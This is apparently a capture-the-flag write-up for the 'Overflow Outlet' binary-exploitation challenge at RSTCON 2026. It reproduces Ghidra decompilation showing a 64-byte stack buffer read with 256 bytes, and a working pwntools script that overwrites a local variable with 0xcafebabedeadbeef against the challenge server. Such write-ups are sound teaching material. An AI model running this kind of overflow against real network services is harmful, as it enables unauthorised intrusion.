---
title: "RSTCON 2026 – Overflow Outlet"
date: 2026-10-25 08:06:00 +0200
categories: [Events, RSTCON 2026]
tags: [binary-exploitation, buffer-overflow, stack-overwrite, local-variable, pwntools, ghidra, aarch64]
---

## **Challenge Information**
**Title:**  Overflow Outlet  
**Category**:  Binary exploitation  
**Platform:**  RSTCON  
**Difficulty:**  easy  
**Tags:**  binary-exploitation, buffer-overflow, stack-overwrite, local-variable, pwntools, Ghidra, aarch64  
**Date solved:**  25/10/2026 (DD/MM/YYYY)  
**Challenge Description**:  Some hydro skid left its valve controller hanging off the network. It's sitting there waiting for an "actuator sequence," and the valve stays shut until the internal gate flips to the value it's after.  

Mirror 1: `nc 18.215.143.250 9001`  
Mirror 2: `nc 18.145.136.91 9001`  
**Files provided**:  outlet (the binary)  

## **Environment and Tools** 
**Operating System**:  Kali Linux (Parallels)  
**Tools/ Software**:  Ghidra, pwntools, netcat  
**Programming Languages (if any)**:  bash, python  

## **Recognition Pattern**
- A network service that reads a "sequence" into a buffer and compares a local variable against a fixed value
- The read size (0x100) is larger than the buffer (64 bytes) => classic stack buffer overflow
- The local variable sits right after the buffer, so the overflow can set it to the value the check wants

## **Approach and Methodology**
### **Initial Analysis**
i opened the provided executable in ghidra and analyzed it. Out of its functions, there were 3 that stood out: main, vuln and win:
```C

undefined8 main(void)

{
  int iVar1;
  
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  iVar1 = setvbuf((FILE *)stderr,(char *)0x0,2,0);
  vuln(iVar1);
  return 0;
}



ulong vuln(void)

{
  uint uVar1;
  ulong uVar2;
  undefined1 auStack_48 [64];
  long local_8;
  
  local_8 = check_admin();
  puts("RST Hydro control outlet. Send the actuator sequence:");
  fflush((FILE *)stdout);
  read(0,auStack_48,0x100);
  if (local_8 == -0x3501454121524111) {
    uVar2 = win();
  }
  else {
    uVar1 = puts("Valve stays shut.");
    uVar2 = (ulong)uVar1;
  }
  return uVar2;
}




int win(void)

{
  int iVar1;
  char *pcVar2;
  char acStack_98 [128];
  FILE *flag;
  FILE *key;
  int local_4;
  
  local_4 = 0;
  while ((local_4 < 0x32 && (key = fopen64("/dev/valvekey","r"), key != (FILE *)0x0))) {
    pcVar2 = fgets(acStack_98,0x80,key);
    if (pcVar2 != (char *)0x0) {
      printf("Valve open. %s",acStack_98);
      iVar1 = fclose(key);
      return iVar1;
    }
    fclose(key);
    usleep(2000);
    local_4 = local_4 + 1;
  }
  flag = fopen64("flag.txt","r");
  if (flag == (FILE *)0x0) {
    iVar1 = puts("Valve key not seated on the server, tell an organizer.");
  }
  else {
    pcVar2 = fgets(acStack_98,0x80,flag);
    if (pcVar2 != (char *)0x0) {
      printf("Valve open. %s",acStack_98);
    }
    iVar1 = fclose(flag);
  }
  return iVar1;
}

```

The vuln() function is important because it holds the vulnerability that will be exploited in order to get the flag. 

The server will ask us to enter a key/sequence to open the valve and get the flag. The vulnerability is a buffer overflow: auStack_48 has 64 bytes, but the read takes 0x100 (256). So we can go past the buffer and overwrite other things on the stack. The variable i need to overwrite is local_8, which is used right after, inside the if. 

So to solve this i simply need a padding (A*64) to fill up the buffer and then write what i actually need so that local_8 holds the right value when the comparison happens.

The value 0xcafebabedeadbeef represents -0x3501454121524111, but i cannot send it as a negative value directly, so i need to calculate it. (I asked Claude to do it.)


The last thing to do now was write the python script and get the flag.

```python3
from pwn import *

context.arch = 'aarch64'
payload = b"A"*64 + p64(0xcafebabedeadbeef)
  

#nc 18.215.143.250 9001
conn=remote("18.215.143.250", 9001)
print(conn.recvline())
conn.sendline(payload)

#important! needs to catch everything before the connection closes

print(conn.recvall(timeout=2).decode(errors="ignore"))

conn.close()
```
## **Solution and Flag Retrieval**
Final Exploit / Command Used: ./solver.py
```bash
[+] Opening connection to 18.215.143.250 on port 9001: Done
b'RST Hydro control outlet. Send the actuator sequence:\n'
[+] Receiving all data: Done (48B)
[*] Closed connection to 18.215.143.250 port 9001
Valve open. [REDACTED FLAG]

```
## **Lessons Learned**
- a buffer overflow can overwrite a local variable that a later check depends on, not just the return address
- a value compared as a negative number can be supplied as its unsigned two's-complement form

## **References**
- Ghidra
- pwntools (https://docs.pwntools.com)
